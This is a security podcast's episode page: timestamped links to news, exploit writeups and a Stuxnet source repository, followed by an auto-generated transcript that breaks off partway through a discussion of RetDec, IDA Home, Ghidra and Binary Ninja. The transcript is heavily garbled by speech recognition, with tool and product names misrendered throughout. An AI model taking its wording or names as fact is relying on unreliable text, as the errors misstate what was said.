width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/BOntbAGzYtU\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n<hr />\n<p>Starting off the week with a discussion about the disappointing IDA Home, before moving into a few easy command injections, code-reuse attacks applied to XSS, detecting trojaned hardware and ending with a subtle crypto-bug.</p>\n<p>&nbsp;</p>\n<ul>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=53\">00:00:53</a>] <a href=\"/transcript/episode-36/\">DAY[0] Episode Transcripts now Available</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=181\">00:03:01</a>] <a href=\"https://wccftech.com/microsoft-buys-corp-com-to-keep-it-safe-from-hackers/\">Microsoft Buys Corp.com to Keep It Safe from Hackers (Over $1.7 Million Deal)</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=350\">00:05:50</a>] <a href=\"https://www.hackerone.com/blog/hack-good-easily-donate-bounties-whos-covid-19-response-fund\">Hack for Good: Easily Donate Bounties to WHOâ€™s COVID-19 Response Fund</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=663\">00:11:03</a>] <a href=\"https://engineering.avast.io/retdec-v4-0-is-out/\">RetDec v4.0 is out</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=1061\">00:17:41</a>] <a href=\"https://www.hex-rays.com/products/ida-home-is-coming/\">IDA Home is coming</a><br />\n\t<ul><li><a href=\"https://www.sophia.re/Binary-Rockstar/index.html\">https://www.sophia.re/Binary-Rockstar/index.html</a><br /></li><li><a href=\"https://nostarch.com/GhidraBook\">https://nostarch.com/GhidraBook</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=2032\">00:33:52</a>] <a href=\"https://community.sophos.com/products/sandboxie/f/forum/119641/important-sandboxie-open-source-code-is-available-for-download\"> Sandboxie Open Source Code is available</a><br />\n\t<ul><li><a href=\"https://github.com/xanasoft/Sandboxie\">https://github.com/xanasoft/Sandboxie</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=2289\">00:38:09</a>] <a href=\"https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo\">Exploiting the TP-Link Archer A7</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=2818\">00:46:58</a>] <a href=\"https://zeta-two.com/software/exploit/2020/04/05/exploiting-starcraft1.html\">Exploiting the Starcraft 1 EUD Bug</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=3091\">00:51:31</a>] <a href=\"https://mazinahmed.net/blog/ohmyzsh-dotenv-rce/\">OhMyZsh dotenv Remote Code Execution</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=3387\">00:56:27</a>] <a href=\"https://packetstormsecurity.com/files/157163/symantecwg5028-exec.pdf\">Symantec Web Gateway 5.0.2.8 Remote Code Execution</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=3563\">00:59:23</a>] <a href=\"https://www.vmware.com/security/advisories/VMSA-2020-0006.html\">VMware vCenter Server Sensitive Information Disclosure [CVE-2020-3952]</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=3707\">01:01:47</a>] <a href=\"https://blog.truesec.com/2020/04/03/bypassing-modern-xss-mitigations-with-code-reuse-attacks/\">Bypassing modern XSS mitigations with code-reuse attacks</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=4077\">01:07:57</a>] <a href=\"https://arxiv.org/abs/2004.03728v1\">Practical Data Poisoning Attack against Next-Item Recommendation</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=4308\">01:11:48</a>] <a href=\"https://arxiv.org/abs/2004.02997v2\">Hardware Trojan Detection Using Controlled Circuit Aging</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=4586\">01:16:26</a>] <a href=\"https://arxiv.org/abs/2004.01403v1\">A \"Final\" Security Bug</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=BOntbAGzYtU&t=5233\">01:27:13</a>] <a href=\"https://github.com/christian-roggia/open-myrtus\">RCEed version of computer malware / rootkit MyRTUs / Stuxnet.</a><br />\n\t<ul><li><a href=\"https://github.com/christian-roggia/open-myrtus/blob/master/rootkit/FastIo.c\">https://github.com/christian-roggia/open-myrtus/blob/master/rootkit/FastIo.c</a><br /></li><li><a href=\"https://xkcd.com/350/\">https://xkcd.com/350/</a><br /></li></ul></li>\n</ul>\n<p>Watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p>\n<!--TRANSCRIPT\n{\"transcript\": [{\"speaker\": 1, \"line\": \" Hello everyone. Welcome to another episode of the day Zero podcast. I'm Specter with Mia zi. This is the Easter edition, I guess so the podcast happy Easter to anyone who you know celebrates that for Easter weekend or for\", \"start\": 16.7}, {\"speaker\": 2, \"line\": \" their next week for those thinking the Greek Orthodox calendar. Oh\", \"start\": 29.4}, {\"speaker\": 1, \"line\": \" today I learned I didn't even know there was a different Eastern Easter for them.\", \"start\": 34.2}, {\"speaker\": 2, \"line\": \" I believe this weekend is now I can't think of the name effect.\", \"start\": 37.5}, {\"speaker\": 1, \"line\": \" Whatever starts the week before Easter. Okay, before we have some before we jump into topics, we do want to mention we have been getting transcripts tons. He's been working on that. So you'll find on our Blog the transcripts are up for the last episode and all the episodes going forward are going to have transcripts as well. They're not perfect. They are about\", \"start\": 43.0}, {\"speaker\": 2, \"line\": \" their General are far from perfect. I will say that right now like since we since I do have it on screen you can see on here there for anybody. It's from song. Go is what Specter said very early on and when he introduced me it's so I'm Specter with me a zi.\", \"start\": 65.0}, {\"speaker\": 1, \"line\": \" So, you know, I've gotten your name is kind of weird way. I can't\", \"start\": 82.0}, {\"speaker\": 2, \"line\": \" be. Yeah, I saw it did during my test runs actually get zi, correct when I gave it the hints for it, but regardless, I mean it's definitely not good, but there's enough there that you know, you can control laughs for something of interest if you want links links to the video on the side to get what we actually Said about something just trying to be there for those of you who don't really want to listen to All two hours, but maybe want to find a particular topic, you know, it's in there. It's probably not going to get any more accurate anytime soon. This is already using like Google speech to each attack stuff using their premium versions of it. So this is probably as good as it's going to get for a while until somebody actually wants to manually do it.\", \"start\": 86.1}, {\"speaker\": 1, \"line\": \" Wait, what's what I found kind of funny but the transcripts was for some reason. It seems Google speech seems to think me and anti are the same person. It will kind of put our statements together. Like it'll put stuff that anti says under my name.\", \"start\": 134.4}, {\"speaker\": 2, \"line\": \" Yeah. Well, so at the end of statements actually so kind of happens on this one here this starts off that we as we covered on Facebook research when I was talking about last episode. Well Facebook research that we was Something. I Said Knock You So it does seem to some delay in there unless you just now mentioned like transcripts are there all the episodes going forward will have a link to the link to the transcript at the\", \"start\": 147.5}, {\"speaker\": 1, \"line\": \" bottom. Yeah, so with that being said we'll jump into some topics. So we're going to kind of revisit something here a little while ago. We talked about Corp.com. There was a Krebs article on it back in February and how Microsoft was basically kind of being extorted in a way to try to buy it for 1.7\", \"start\": 177.8}, {\"speaker\": 2, \"line\": \" and all that was episode 28. Yeah anybody who wants to look back and what we call him dead?\", \"start\": 197.3}, {\"speaker\": 1, \"line\": \" Yeah. So the reason for that is, you know, internal corporate networks will try to send like Scholes and data Corp.com due to defaults from all the way back in the 90s and the previous guy who the guy who owned it. Myk O'Connor he had it for 26 years and was trying to sell it for 1.7 million dollars and it seemed originally Microsoft wasn't going to buy it. They offered 20K for it like many years ago, but it didn't go through. Well, it seems Microsoft actually has now kind of bit the bullet and bought it. So, you know just kind of a follow-up to that story. We covered a little while ago. I think it's pretty cool.\", \"start\": 203.5}, {\"speaker\": 2, \"line\": \" I mean I still kind of think it feels very much like extortion at the same time me the fault here is like it is Microsoft's fall for choosing to use Corp.com as their default rather than you know, there are reserved in special use domain names dot invalid should always give you an NX domain return response Dolph Local Host is reserved. No RFC whatever for it should always return the loopback address da test. Like there are options here that could be used. That said maybe it wasn't at the time. I actually don't know when those rfc's came into play. But at least you know future updates. It should have been changed.\", \"start\": 239.4}, {\"speaker\": 1, \"line\": \" I mean, I think we're kind of an agreement that they shouldn't have had to but at the same time, you know, 1.7 million dollars kind of a drop in the bucket for Microsoft and I think it's it's still a good move by them, you know protect their customers and stuff like that.\", \"start\": 285.4}, {\"speaker\": 2, \"line\": \" So, yeah, it's a good move for them. But I just can't really stand behind the guy also try to sell it for\", \"start\": 298.5}, {\"speaker\": 1, \"line\": \" that. Yeah, I mean, yeah, it's kind of annoying on that part, but overall, you know, it worked out I think\", \"start\": 305.6}, {\"speaker\": 2, \"line\": \" yeah, then like I said, it's a drop in the bucket. So I mean like I do think Microsoft should have bought it bought it earlier. Yeah, it's like we talked about this. I mean, it just feels very much like extortion on that, you know saying how he's going to sell it if Microsoft doesn't buy it I can get him trying to get rid of it, but Yeah, I mean we like I said, this was episode 28 we spent spent a fair chunk of time talking about it actually.\", \"start\": 315.1}, {\"speaker\": 1, \"line\": \" Yeah, so you can go back and get the full conversation on that if you want a bit more insight into that but move on so usually when we cover the, you know, covid-19 stuff that's going on. It's usually in a negative light with things being canceled and stuff like that. But we're going to bring some positive news around it. And that's that hacker one is starting a little campaign where you can actually donate bug Bounty payouts or a split of them directly to the who covid-19 response fund.\", \"start\": 345.2}, {\"speaker\": 2, \"line\": \" Yeah, so I didn't realize but this is actually kind of old news kind of new so I wasn't familiar with this aspect with hacker one. You can set collaborators when you have a bounty said who your collaborator what was and then you can like split the Bounty which is pretty cool. There's a particular user hack for good which was split here Bounty with a Charitable organization or with some charity. So this month it happens to be the who and their covid-19 response fund but that changes every month. So it's not necessarily a new feature. It's just that the hack for good this month is in particular on the who was response fund. Yeah.\", \"start\": 373.6}, {\"speaker\": 1, \"line\": \" So like you were saying it works through their built-in collaborator system. You just add the user for for that and set the ratio you want to split to donate. And invite them to the report not all bounties support collaboration. But in those cases you can email them to set it up as well. I do have some questions around it though. I'm guessing this is all up to the researchers. And so ultimately they're the ones getting paid. But yes, I do with inviting a collaborator could vendors split researcher payouts forcefully, I wonder Like\", \"start\": 418.5}, {\"speaker\": 2, \"line\": \" I imagined some things through\", \"start\": 451.6}, {\"speaker\": 1, \"line\": \" so on so\", \"start\": 453.3}, {\"speaker\": 2, \"line\": \" so I don't think vendors could necessarily do a forcefully if there probably is a means that they could have some agreement with hack Wanda that said, I mean this also feel like when companies do this it always feels a little bit little bit cheap to me. So it's not that this is a bad thing in a sense, but at the same time hacker One is basically just making it easier for you to donate but you donate through them. So they get the tax\", \"start\": 455.9}, {\"speaker\": 1, \"line\": \" write-off.\", \"start\": 484.1}, {\"speaker\": 2, \"line\": \" That's a boy. That's and that's why companies do this like you're able to place the donation through them. It's same thing like supermarkets when they ask you to donate. They're donating that money. They get the tax write-off for you. Just you know, get to donate my conveniently. so, I mean imagine if hacker one were to decide, you know, if this was because this was important enough for them to put out the Blog post about who this months now, and actually I guess to be fair. I don't know if they put out this like every month of blog post with it. I don't recall seeing similar blog posts in the past stacker one is one of the blog's that I follow for this but assuming they don't they found this one to be a particular importance to mention this option to donate. Imagine if they were to just take off the top like a percent of their cock rather than saying like research Had to give out of their cup but hacker one which is going to donate a percent again, that would have a much greater impact. They're just saying like yeah, take your money. You can donate through US.\", \"start\": 486.9}, {\"speaker\": 1, \"line\": \" Yeah, ultimately the money is coming out of the researchers pocket not the vendors order hacker wants pocket. Yeah, they like you're saying they are getting the right off. So maybe maybe not as much of a positive light as I initially thought but that\", \"start\": 554.3}, {\"speaker\": 2, \"line\": \" is not I mean it's so things like this. So to be clear like they do add a convenience factor to making the donation. They're definitely going to be people that wouldn't have donated otherwise, so it is getting my same thing with the supermarket system. Just having it so convenient and right there leads to more people donating like it does actually help with that. So it is a good thing. It's just you know, it always feels like a little bit of a scam to me when I see these\", \"start\": 566.0}, {\"speaker\": 1, \"line\": \" things. Yeah, my bigger worry was that point I brought up earlier with like I'm what wondering if vendors could forcefully split the payouts. I honestly don't think that wouldn't happen. I think that would be like, I\", \"start\": 593.3}, {\"speaker\": 2, \"line\": \" don't think there's any word. I mean, I don't know what their side looks like for that.\", \"start\": 606.4}, {\"speaker\": 1, \"line\": \" But yeah, that's what kind of wondering like obviously we don't have insight into that because we don't have a hacker one Downey running. So I don't know what the vendor view of that looks like, but it was just something I was kind of thinking about fair enough if anybody is running like a half. Our one program. Feel free to let us know if you know, I'm off base but that but that was just something I kind of was thinking about\", \"start\": 609.9}, {\"speaker\": 2, \"line\": \" it. Well, I mean that functionality seems like something that would be more based on the researcher to say who their collaborator is not a vendor to say you collaborated with this person. Even if you didn't\", \"start\": 631.0}, {\"speaker\": 1, \"line\": \" the only reason like I think along those lines too, but I'm also thinking vendors might not want people just arbitrarily inviting collaborators in so I'm wondering if they might have At least some sort of influence on that but I don't know. It was just something, you know, it's not something I can take concretely one way or the other but it's been a while since we've had some releases and we have one right now and it's the red deck decompiler and it's hit version 4.0. So for those of you that don't know about rep tackett's decompiler based on llvm and it supports like a variety of architectures sports. X86 64 a rmp. Also\", \"start\": 642.6}, {\"speaker\": 2, \"line\": \" 64 is one of Of the newer things\", \"start\": 682.4}, {\"speaker\": 1, \"line\": \" for is one of the newer things. Yeah. Yeah. Yeah and also supports like other file formats like Pease elfs Mac OS so it supports like a lot of stuff but with 4.0 like you were just saying it's added even more support. They have support for Eric 64, they added support for Json output and they have a more modular build system. So\", \"start\": 686.8}, {\"speaker\": 2, \"line\": \" yeah, so it's the build system that I'm kind of most excited about so I've used wrecked actually for quite a while was kind of my go-to. The compiler, you know when I didn't have access to Ida so it was a so early on it was basically a web interface you can upload a file and it'll do the D compilation. They had an API also that actually tied in there's an Ida plug-in you can use so when they open source this I think it was like I want to say a few years back with maybe 2017 2018. They open source that it was an exciting thing because now you know, it would become a lot more useful the reality though was it was an absolute pain to use. So the new build system seems like it should make that easier. They basically Specter already mentioned me a lot more modular. They swapped out or got rid of all the shell scripts for Python scripts. Hopefully will be an improvement. I haven't been able to try it yet, but I'm hoping that will kind of improve the usability of it. And I think the Json output is an interesting they've added, you know instead of just Being able to pull out. The actual D compilation they basically got all the tokens that does put set in Jason form. So if you want to process with something else, you don't need a reprocess the decompiled output. It's already done that for you. And I just kind of removing One Step, but it makes it a lot more usable for the\", \"start\": 706.2}, {\"speaker\": 1, \"line\": \" machine. I will say it's really nice because I don't know if you'd want to argue with me on this point, but I'd say Jason is probably the best non-binary cereals serialization format. So I really like when things that have Jason support especially for something as useful as like\", \"start\": 803.2}, {\"speaker\": 2, \"line\": \" when decompiler so, I mean, it's more than just the Json support here though. It's fact that's adjacent support of all the tokens that it generated a me. I think that's kind of the key thing. They're having That was tokens already having a tokenized just because otherwise, you know for just outputs found you do expect a decompiler to Output source code. You do expect it to Output that not Jason. So the fact that you don't have to do that step. You just you get more accuracy out of fact, I think that's kind of a net positive for if you want integrate this as just a step in a further further workflow. They've made that a lot easier to\", \"start\": 821.3}, {\"speaker\": 1, \"line\": \" do. Yeah, basically they make it they made it so you cut you can still skip the step of parsing like Friday the lexical parser yourself it basically does that part for you, which is that really awesome because doing lexical parsing is like it is quite complex the other part that's pretty cool that they added as they actually have a library for now to they have like an official library for it. So and I think it has like bindings for a lot of the popular languages like, you know rust see golang so it's got a I think it's got a lot of those bindings if I remember right from when I looked at the GitHub for it, I'd say the library is probably the coolest part. I did want to ask a question though because you were saying you've used red deck a lot. I haven't really used it. How does it compare in like how accurate it is compared to like x-rays or sleigh for example,\", \"start\": 864.1}, {\"speaker\": 2, \"line\": \" so that's I haven't done really a really good comparison there. So I was using it to one of the reasons I was using is because it's poor mips, which I didn't. Or actually I'm not even sure if Ida does well. Yeah, I don't know if I had a dust support mix yet with its decompiler, but there's\", \"start\": 914.0}, {\"speaker\": 1, \"line\": \" probably a plug-in for it or something but\", \"start\": 933.0}, {\"speaker\": 2, \"line\": \" perhaps like I'm not sure either way so and I have had a chance to play around with deidre's decompiler and MEP stuff. So I can't really say how good or bad it\", \"start\": 935.0}, {\"speaker\": 1, \"line\": \" was. Okay,\", \"start\": 944.3}, {\"speaker\": 2, \"line\": \" because this was working on some PS2 stuff when I was using\", \"start\": 946.9}, {\"speaker\": 1, \"line\": \" it. But in your experience using red deck was the it was better than snowball fairly accurate.\", \"start\": 950.0}, {\"speaker\": 2, \"line\": \" Well, no bar though. So again, I was working on PS2 stuff there. Like I couldn't expect it to have the library stuff. Like I couldn't expect it to know all that. So I can't even compare on that. It was just it was definitely sufficient for what I was doing and like said better than snowball.\", \"start\": 957.2}, {\"speaker\": 1, \"line\": \" It could be something fun to look at you know on a stream just trying to compare like the decompiler of put rub threat deck compared to slay and possibly X-rays. I don't know if we could with weed\", \"start\": 976.3}, {\"speaker\": 2, \"line\": \" wandering Souls, but I mean, I think there would be so this is kind of actually leading up I think to some of them will get in the next topic but I do think that's something we could do actually more of a tool comparison with binary ninja guidera, Ida and well maybe right until we don't have the decompiler yet though Zach. Yeah. We fight I mean just the tool comparison in general, but I think we could do something with that\", \"start\": 986.7}, {\"speaker\": 1, \"line\": \" taking out of had apparently snake. Does that sorts race does support it?\", \"start\": 1014.3}, {\"speaker\": 2, \"line\": \" Yeah. Okay, then either the support came after I was working on it or I just didn't have that decompiler since I know you have I can't think of why my work with need the mips the compiler so I could imagine it also just wasn't paid for either way. I didn't have it through x-rays is what\", \"start\": 1017.6}, {\"speaker\": 1, \"line\": \" he'll say. say Yeah, so now this this looks pretty cool. I probably will end up taking a look at this personally for maybe some like projects. I'm working on and stuff. So, you know, definitely one of the bring that up it does seem like there's been a lot of good and bad like quality of life improvements. And\", \"start\": 1035.5}, {\"speaker\": 2, \"line\": \" yeah, we said we don't cover the releases Too Much Anymore compared to the first step. So it's with this one. I thought was a bit of a\", \"start\": 1052.4}, {\"speaker\": 1, \"line\": \" standout. Yeah, so, you know, we've been talking about Ida and x-rays so we'll get into Ida home so ill fact Talk about a week ago or so tease the coming of Ida home, which was said to be a product that would address can common Community concerns around Ida, which you can tell right away if the price point because the future set of ideas pretty good. It's just far too expensive for most people so, you know this got some pipe people were thinking maybe we'll get I to with a decompiler for one architecture for a reduced price or something like that and it ended up being a disappointment. It basically ended up being Ida free but with i 2 pi, Thon and debugging swell four not five dollars a year\", \"start\": 1058.2}, {\"speaker\": 2, \"line\": \" not even Ida free because you only have one processor family.\", \"start\": 1099.6}, {\"speaker\": 1, \"line\": \" So it's even worse than I have for you,\", \"start\": 1104.3}, {\"speaker\": 2, \"line\": \" but I think you're basically paying for the Ida python is basically what you're paying three hundred and sixty five dollars a year for and you only get the annual payment. There's no monthly option with that\", \"start\": 1107.0}, {\"speaker\": 1, \"line\": \" and that's not worth it. Not even close\", \"start\": 1119.2}, {\"speaker\": 2, \"line\": \" 64-bit applications. Also, I don't know decide a free support 64-bit yet.\", \"start\": 1122.7}, {\"speaker\": 1, \"line\": \" I think since 7.0\", \"start\": 1127.9}, {\"speaker\": 2, \"line\": \" it okay. So yeah, so that's not that's not new you do get the Which I don't think is in\", \"start\": 1129.3}, {\"speaker\": 1, \"line\": \" free. It's not at the same time. Maybe I'm a bit biased here, but I absolutely do not like I'd as debugging friend anyway, so I don't know what the common opinion is on that but I do not like Ida's debugging capabilities and I never use it.\", \"start\": 1135.9}, {\"speaker\": 2, \"line\": \" So yeah, which is fair. I mean, I think it comes down to differing use cases. I feel like it's a lot more useful for people that are doing like reverse engineering on something like doing malware re where you've got it running on some foreign. System using the network interface do the debugging. Oh, no, I feel like with Ari and might have a little bit more use and just with exploit\", \"start\": 1150.7}, {\"speaker\": 1, \"line\": \" development. Maybe yeah. I mean ultimately what it comes down to though is you're getting debugging and I to python for three hundred sixty five dollars a year, you know, it seems we're not alone. I think the community feedback all the community feedback. I seen on it seem to be exclusively negative. I don't know if I saw one positive comment on it.\", \"start\": 1173.4}, {\"speaker\": 2, \"line\": \" It's I saw some defensive item, but here's the thing. It's this really just feels like it's too little too late. It was kind of the feeling I got from this and I was thinking about this because I was going to do some responses. I mean I saw this on Reddit, so it's going to Involved there, but you know the thing is I don't care. What I realized is. I don't think Ida has ever really had the Goodwill of the community. Ida has always been something as far as I've noticed. It's kind of just been something you begrudgingly have to use because it was the best thing available but nobody really liked x-rays as a company. Nobody really like the fact they were overcharging for it. And I mean as far as I can tell everybody's felt like they've been overcharging for this they've had the market Eminence and they've done nothing with it which is kind of the other thing. I mean, there isn't a law that you can kind of push with Ida that says our that shows how Ida has really innovated. I think at best you can pull out, you know, the wind graph the whole graphic system. I'm not sure this was before my time. I know the wind graph itself. Amen somewhere like the four dot something era so like early 2000 And I don't know if they were the first to do the graphing view or not. But I mean that's as close as I think he'd come to really saying they had any\", \"start\": 1193.8}, {\"speaker\": 1, \"line\": \" Innovations. The only thing that's happened and like the last like couple major version numbers is undo and it's literally like it's undo every other application has it so it's not really that innovational. I don't think\", \"start\": 1272.3}, {\"speaker\": 2, \"line\": \" yeah, I would have chat Razzie. Woo mentions. Do they have big institutional clients might explain why they don't care about individual customers. And yeah, that's kind of the big thing is the professionals are using this professionals use either. That's the main tool that I do think there's a bit of a shift, but that was kind of Point like it's something you know, they just use that you're paying for the support. Also, you do get that\", \"start\": 1287.1}, {\"speaker\": 1, \"line\": \" support which of course large\", \"start\": 1309.3}, {\"speaker\": 2, \"line\": \" clients do want to have somebody they can call if something breaks like thing or get bug fixes in there compared to waiting for like, you know open source with Deidre or something you put in a issue and maybe it'll get fixed. Maybe it won't or fix it yourself. Yeah, I mean you can do that. But so that is a big thing for Ida. They do have the market dominance. But what else can I get? NG is I don't feel like they've really innovate. They haven't really taken any good steps with that to be fair to them. They have had kind of that constant incremental upgrades. So I actually did go and look through the change long just to see if maybe I was missing something and people are definitely welcome to correct me on this. But as I was just kind of stepping through kind of the major releases and looking at the release information. There wasn't a ton the like, you know 6.0 with a big thing was the new GUI was using QT. Like our sorry, I think that might been 6.0. I pull it off. Yeah 6.1 though. It was like Android support utf-8 support 6.2. They had to GUI installer. If things like that, like, you know, especially jumping back on 6.1 with the font stuff like or with the text parsing like okay that makes sense to do. It's just nothing really stood out at any point. It's really being all that Innovative in the last, you know, 10 years. Maybe I'm mistaken on something. Maybe I just missed it, you know got stuck in my ways only using the features I use and that's it. But on the other hand though, you've got kedra which again, I mean, I'm not sure why I really pulled us being really Innovative with them, but they do have a good compiler. They don't have the Debugger, but what I will point out is binary ninja in the same price point as Idaho has plenty more offerings. In terms of that feature. Yeah, but the big thing in terms of like Innovation is that Intermediate Language the BNI else which right now they have the to the low-level the mid-level soon enough. They've been teasing it on Twitter is they'll have the high level which is effectively there decompiler. But so, you know at least binge are you've\", \"start\": 1311.6}, {\"speaker\": 1, \"line\": \" seen\", \"start\": 1456.3}, {\"speaker\": 2, \"line\": \" something new coming up something that's actually trying to innovate a bit and the ILS I think are really great idea. If you're not familiar with the intermediate languages are basically they're the first one the low-level IL is actually I'll just pull up a page with a sample\", \"start\": 1458.4}, {\"speaker\": 1, \"line\": \" here. And one thing I will say about the ILS while you're pulling that up is what also makes them really good is they have strong built-in plugin support to so like you can make plugins that can interface with the IL like very easily that is one like big thing with Benja is the the plug-in API is extremely strong and consistent unlike Ida's as well. Yeah. Yeah. I mean it's going to\", \"start\": 1475.4}, {\"speaker\": 2, \"line\": \" show like, yeah the plug-in API and step its effectively a first-class citizen here with in binary integer. But yeah, I was just going to pull up like the low-level IL basically just rewriting your assembly instruction to some that just slightly more readable, you know breaks out the conditionals breaks out the flags that are used. Industry right side has a very simple like if tracks you greater than 0 XE and shows you like the ethanol so I could just some really simple rewriting of it. The mid-level one goes just a little bit. Little bit higher giving you variables giving you some of the function calls. Just some basic ideas that are but it's really useful when you're just scanning. The instructions to be able to look that and then on the other hand instead of having the decompiler the ILS at least, you know on the low level IL it's a very unlikely to be lying to you about what anything stealing where's compilers definitely make wrong assumption. So you can jump through these different levels and you know, once they have a decompiler something doesn't quite make sense you jump back. He look oh, you know in the medium level 1 you can see it's actually not creating this structure. You don't have to jump. All the way back to the assembly. It's just it's a little Time\", \"start\": 1501.5}, {\"speaker\": 1, \"line\": \" Saver you get more views instead of one or two. Sorry.\", \"start\": 1582.3}, {\"speaker\": 2, \"line\": \" Yeah, and so I just had like, you know with binary ninja it's something new that they've actually Innovative with it's something new from them. Like Ida does not offer any sort of il-2 use. I don't think he'd refers anything like that either unless maybe throw plug-in, but not that I'm aware of. So just in terms of like trying to innovate at least binary Ninja 'he is one they're cheaper to they are actually making some attempt to innovate with what they're doing. So I need at this price point. Yeah, go ahead. I was just gonna say at the price point the personal student version of this is like half the price of Idaho more support although on that note. It's not multi-threaded. I think do you have you have a personal license Specter? I have a personal yet. I don't know. So how has the performance been kind of? Large files because that is something like Ida does pretty well with large files kedra still not great.\", \"start\": 1586.7}, {\"speaker\": 1, \"line\": \" It's not been too bad the initial like analysis speed and stuff like that as a bit slower, but it's gotten better because initially binary ninja personal didn't have analysis caching. So each time you loaded a binary would have to do the analysis phase every time they've actually changed that though in the last like year or so. I think they've added analysis caching to the personal version as well. So So, you know there is a bit of that. It's kind of like Dedra in a sense. There's a bit of a overhead on the initial analysis time. But once that's done, you know, the binary ninja database file is built and then it's like, you know when you open it in the future all that stuff's already done for you. So it's not that bad honestly and I and on that point, I don't think I'd is multi-threaded either is\", \"start\": 1646.7}, {\"speaker\": 2, \"line\": \" it? Oh, I don't know if it's multi-threaded, but I know Ida has generally at least seem to have better performance when it comes to large\", \"start\": 1690.3}, {\"speaker\": 1, \"line\": \" files. yeah, okay,\", \"start\": 1697.1}, {\"speaker\": 2, \"line\": \" I won't make any claims about how it's implemented just I think generally speaking you know where that's been one of the challenge point is how does it handle large files? Yeah\", \"start\": 1699.3}, {\"speaker\": 1, \"line\": \" going back a bit to what you were saying earlier with like Ida being that thing that you kind of have to use I would say it?s almost like the Photoshop a reverse engineering in that respect not Everyone likes it. It's the industry standard but unlike Photoshop. We are seeing competition come to it. And I think that is you know, that kind of answers the question of why now like wire Ida kind of trying to Push for this I think it's safe to say Ghidorah as well as Vector 35 announcing that decompiler coming for Ben. Shh like you were talking about earlier could be spurring that on a little bit and I've also been noticing that people in the industry are starting to switch even people from these companies you were talking about earlier. I've been seeing that they've been switching to get jar or binary a ninja and you know, that's where they're big license money comes from those from those companies. Yeah. That's another when I disappear switch. I mean,\", \"start\": 1711.9}, {\"speaker\": 2, \"line\": \" I don't think That's going to disappear too quickly. But I do agree. I'm seeing that shift of people moving away and it comes in a few different ways. Obviously, there's kind of newcomers to the field. Ida isn't getting recommended as strongly anymore. Just plain and simple like I mean I the Ida Book used to be this one of the standard recommendations for books in addition to like reverse saying the secrets of reverse engineering and stuff. You know, the I to book was just some that you'd also pick up why because you're going to be using Ida. Maybe it was just a given that has definitely changed in the last several years, you know, there's definitely been punished for people just aren't like it?s still kind of considered the best option but your sufficient with Deidre your sufficient with binary ninja other more affordable options and from that with newcomers to the field starting to use those other tools eventually, you know, they become professionals. They're not using God. Ida so over time I think we can see either becoming relegated those kind of like Pearl those people that have used it all the time and never really moved on but those are kind of keeping up. Yeah, I've noticed the same thing people are starting to move away. It's not in huge numbers. It's not like flocks of people are just suddenly not using Ida and even when they are it's usually like they still have a night out license, but they're personally like their daily driver is something else. And so like I just get the feeling that it?s time is limited, especially if we keep seeing improvements coming which I think we will I do too.\", \"start\": 1762.8}, {\"speaker\": 1, \"line\": \" Yeah.\", \"start\": 1864.2}, {\"speaker\": 2, \"line\": \" Yeah, like I'm definitely excited with binary ninja what they've been doing by Deidre to at the same time like it is going to be a slow thing. Like, we're not just one day going to see like one day soon. Just see Ida completely. I knew you was like it like I and the support the Enterprise customers. It's been it's had such a market dominance for a while. It's going to take a while for that to disappear. But personally after I lost lost my Ida license for my last job, like I kind of you know sat back I thought like, you know, do I want to go and pay for one myself or I just kind of came to the realization myself. I just don't want to support item as a company. No, I have the same way. So they're probably never going to sponsor us now, but like that'll happen. Anyhow, but I name is phosphorus. Anyway, yeah, but I mean, it's just I kind of realized that as a company think never really had that Goodwill. They've just kind of been you know, the dominant for see have to use it that said I think binary ninja definitely kind of part of the community interacts with the rest of the community and stuff. I mean I could get behind them that said before I know where high in the Gangstar to pull this off. I do want to kind of just plug in this I to section a new book coming out the Goodra book. I had mentioned the Ida book. So the ghee Drew books coming out supposedly June or sorry July 20 20 of so if you use the code coupon code, so this is no starch, press no. It's all columns change your book and you can use the code right now operation for 40% off. So I'll just plug that in with the eye to stuff if you want to look at something other than Ida,\", \"start\": 1864.5}, {\"speaker\": 1, \"line\": \" I guess I'll just kind of end off with like I've hung I'm sitting here wondering like if Ida or rather hex rays will ever sort of come down to earth with the community. It seems they've always been like so detached. It's like, I don't know if they're ever going to I mean,\", \"start\": 1980.2}, {\"speaker\": 2, \"line\": \" they're going to have to I think\", \"start\": 1995.9}, {\"speaker\": 1, \"line\": \" eventually yeah, they might be forced to your right.\", \"start\": 1997.6}, {\"speaker\": 2, \"line\": \" But at the same time like moves like this or just you know, they're doing too little and they're doing it too late.\", \"start\": 2001.3}, {\"speaker\": 1, \"line\": \" It just shows how much they like like it's\", 